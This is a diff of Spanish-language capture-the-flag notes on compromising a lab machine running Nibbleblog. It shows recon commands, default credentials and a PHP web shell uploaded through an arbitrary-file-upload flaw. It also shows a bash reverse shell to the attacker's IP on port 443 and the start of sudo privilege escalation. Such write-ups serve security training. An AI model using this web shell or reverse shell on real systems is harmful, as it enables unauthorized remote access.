@@ -1,7 +1,7 @@
 ## Summary
 
 Tags: 
-Y
+
 - IP -> 10.10.10.75
 - Ports -> TCP (22,80), UDP (idk)
 - OS ->  Linux
@@ -9,49 +9,60 @@ Y
     - 22 -> OpenSSH 7.2p2  
     - 80 -> Apache httpd 2.4.18 
 
-
 ## Launchpad
 
 -   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)
 
-## Recon
-Podemos enumerar usuarios con ese version de SSH, ya que es inferior a la version **7.7** 
 Buscaremos con el codename **OpenSSH 7.2p2 ubuntu 4ubuntu2.2 launchpad** y veremos que version de Linux es: Xenial
 Buscaremos con el codename **apache httpd 2.4.18 launchpad** y veremos que version de Linux es: Xenial
-- Comando -> **whatweb http://< URL>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80
-En el Wapalyzer miramos que tiene un PHP, y jQuery 2.1.0 que esta desactualizado. La ultima version de jQuery es **3.6.3**
+## Recon
 
-- Cuando tenemos un **PHP** quiere decir que nos interpreta ese codigo, por tanto no lo veriamos, el que podriamos llegar  a ver seria el de **HTML**.
 
-- Que es Nibbleblog? Es un CMS para crear blogs sin usar bases de datos
+```bash
+❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80
 
-En el codigo de la web **Ctrl + u** encontramos una ruta **/nibbleblog** y mirams que hay. Por lo que creemos que hay mas rutas. Por ende nos ponemos a hacer un FUZZ
+	# Mirar la jQuery
+	# Servidor Web
+	
+- Tiene PHP, jQuery 2.1.0 que esta desactualizado. La ultima version de jQuery es 3.6.3
+- Nibbles es un CMS 
+```
 
-- **wfuzz -c --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ** Para descibrir rutas alternativas
-- **wfuzz -c --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ.php** Para descubrir archivos php y encontramos un admin.php (Panel de autenticacion)
+```bash 
+❯ wfuzz -c --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ
 
-En el panel de autenticacion ya habiamos descubierto que si hya un usuario valido llamado admin, por lo que la password seria igual que como se llama la maquina nibbles. Y asi logramos entrar en la Web. 
+- Encontramos un panel de autenticacion 
+	- Las credenciales por defecto estan en internet admin:nibbles
 
-- **Searchsploit Nibbleblogs** y descubrimos que hay una version que es igual a la de la pagina web 4.0.3 que es vulnerable a Arbitrary File Upload 
-- searchsploit -x 15265.txt Para mirar el contenido del exploit
+❯ wfuzz -c --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ.php
 
-Miramos que hay una ruta en la pagina web en donde podemos subir archivos 
+- Encontramos un archivo 'php' llamado 'install.php' en el se encuentra la version de Nibbles que es 4.0.3 vulnerable a Arbitrary File Upload 
+```
 
-En el cual subiremos el siguiente que sera en php.
+```bash 
+❯ searchsploit -x 15265.txt                 # Para mirar el contenido del exploit que encontramos para 'nibbleblog'
+	# x = examin 
+- Miramos que existe una ruta en el exploit de la pagina web en donde podemos subir archivos, en la cual subiremos el siguiente archivo php con una 'revershell'
+```
+
+```bash 
 nano cmd.php
 	<?p 
 		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 	 ?>
-El cual cuando lo ejecute, nosotros podamos ejecutar comandos
-Este archivo lo subimos en **Pluggins::My images** de la pagina Web
-La ruta en la url en donde los guarda es **/nibbleblog/content/private/pluggis/my_images**
+
+- La ruta en la url en donde los guarda es '/nibbleblog/content/private/pluggis/my_images'
+```
 
 ## User
-Ahora podemos ejecutar comando remotos colocando esto al final de la url **?cmd=whoami**
-por lo que hacemos lo siguiente:
 
-- Comando -> **nc -nlvp 443** Nos ponemos en escucha por el puerto 443
-En la url escribimos lo siguiente /image.php?cmd=**bash -c "bash -i >& /dev/tcp/10.10.14.17/443 0>&1"** Esto nos dara la revershell a nuesta IP
+Ahora podemos ejecutar comando remotos colocando esto al final de la url **?cmd=whoami**
+
+```bash 
+❯ nc -nlvp 443             # Modo escucha para recibir la revershell 
+```
+
+En la url escribimos lo siguiente /image.php?cmd=**bash -c "bash -i >& /dev/tcp/10.10.14.17/443 0>&1"** Esto nos dará la revershell a nuestra IP
 Colocamos lo anterior en url-encode para que nos marque algun error:
 - **bash -c "bash -i >%26 /dev/tcp/10.10.14.17/443 0>%261"** 
 
@@ -70,7 +81,7 @@ Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
 
 Ahora para modificar las dimensiones de nano debemos hacer lo siguiente.
 **stty size** Con este comando podemos ver las dimensiones de la consola nano de 24 80 por lo que debemos de modificar ese valor a este
-**stty rows 51 columns 189** Modificamos las dimenesiones de la consola nano
+**stty rows 51 columns 189** Modificamos las dimensiones de la consola nano
 
 -
 Despues buscamos la primer flag -> user.txt
@@ -78,7 +89,7 @@ Despues buscamos la primer flag -> user.txt
 ## Root
 
 - **sudo -l** Tenemos un privilegio a nivel de sudoers
--Nos debemos de crear una ruta y un archivo con extension .sh que el cual al momento de escribirle algo lo podremos ejecutar como root y asi ganaremos acceso. 
+-Nos debemos de crear una ruta y un archivo con extension .sh que el cual al momento de escribirle algo lo podremos ejecutar como root y así ganaremos acceso. 
 
 nano monitor.sh 
 	#!/bin/bash
